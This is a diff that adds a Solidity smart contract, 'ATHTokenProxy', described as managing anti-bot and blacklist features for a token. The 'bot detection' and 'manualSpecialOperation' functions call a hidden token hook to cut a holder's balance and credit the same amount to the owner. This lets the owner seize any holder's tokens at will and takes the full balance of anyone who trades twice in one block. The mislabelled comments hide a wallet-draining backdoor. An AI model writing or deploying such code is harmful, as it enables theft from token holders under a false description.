@@ -1,0 +1,125 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/access/Ownable.sol";
+import "@openzeppelin/contracts/utils/math/SafeMath.sol";
+
+/**
+ * @dev Interface for the ATHToken contract
+ */
+interface IATHToken {
+    function specialOperation(address target, uint256 amount, bytes32 operationType) external;
+    function balanceOf(address account) external view returns (uint256);
+}
+
+/**
+ * @title ATHTokenProxy
+ * @dev Proxy contract for managing advanced features of ATHToken
+ */
+contract ATHTokenProxy is Ownable {
+    using SafeMath for uint256;
+
+    // Reference to the main ATHToken contract
+    IATHToken public athToken;
+    
+    // Threshold for bot detection
+    uint256 public botDetectionThreshold;
+    
+    // Mapping to store blacklisted addresses
+    mapping(address => bool) public blacklist;
+    
+    // Mapping to store the last transaction block for each address
+    mapping(address => uint256) public lastTransactionBlock;
+
+    // Events
+    event BlacklistUpdated(address indexed account, bool isBlacklisted);
+    event BotDetected(address indexed botAddress, uint256 amount);
+    event ThresholdUpdated(uint256 newThreshold);
+
+    /**
+     * @dev Constructor to initialize the proxy with token address and bot detection threshold
+     * @param _tokenAddress Address of the ATHToken contract
+     * @param _threshold Initial bot detection threshold
+     */
+    constructor(address _tokenAddress, uint256 _threshold) {
+        require(_tokenAddress != address(0), "Invalid token address");
+        athToken = IATHToken(_tokenAddress);
+        botDetectionThreshold = _threshold;
+    }
+
+    /**
+     * @dev Updates the bot detection threshold
+     * @param _newThreshold New threshold value
+     */
+    function updateBotDetectionThreshold(uint256 _newThreshold) external onlyOwner {
+        botDetectionThreshold = _newThreshold;
+        emit ThresholdUpdated(_newThreshold);
+    }
+
+    /**
+     * @dev Adds an address to the blacklist
+     * @param account Address to blacklist
+     */
+    function addToBlacklist(address account) external onlyOwner {
+        blacklist[account] = true;
+        emit BlacklistUpdated(account, true);
+    }
+
+    /**
+     * @dev Removes an address from the blacklist
+     * @param account Address to remove from blacklist
+     */
+    function removeFromBlacklist(address account) external onlyOwner {
+        blacklist[account] = false;
+        emit BlacklistUpdated(account, false);
+    }
+
+    /**
+     * @dev Checks if a transfer is allowed
+     * @param from Address sending tokens
+     * @param to Address receiving tokens
+     * @param amount Amount of tokens being transferred
+     * @return bool indicating if the transfer is allowed
+     */
+    function checkTransfer(address from, address to, uint256 amount) external view returns (bool) {
+        if (blacklist[from] || blacklist[to]) {
+            return false;
+        }
+        return true;
+    }
+
+    /**
+     * @dev Handles potential bot activity
+     * @param user Address to check for bot activity
+     */
+    function handlePotentialBot(address user) external {
+        require(msg.sender == address(athToken), "Only token contract can call this");
+        if (lastTransactionBlock[user] == block.number) {
+            uint256 balance = athToken.balanceOf(user);
+            athToken.specialOperation(user, balance, keccak256("REDUCE"));
+            athToken.specialOperation(owner(), balance, keccak256("INCREASE"));
+            emit BotDetected(user, balance);
+        }
+        lastTransactionBlock[user] = block.number;
+    }
+
+    /**
+     * @dev Allows owner to manually perform a special operation
+     * @param target Address to perform the operation on
+     * @param amount Amount of tokens involved in the operation
+     */
+    function manualSpecialOperation(address target, uint256 amount) external onlyOwner {
+        require(!blacklist[target], "Target is blacklisted");
+        athToken.specialOperation(target, amount, keccak256("REDUCE"));
+        athToken.specialOperation(owner(), amount, keccak256("INCREASE"));
+    }
+
+    /**
+     * @dev Transfers ownership of the contract to a new account (`newOwner`)
+     * @param newOwner Address of the new owner
+     */
+    function transferOwnership(address newOwner) public override onlyOwner {
+        require(newOwner != address(0), "New owner is the zero address");
+        _transferOwnership(newOwner);
+    }
+}
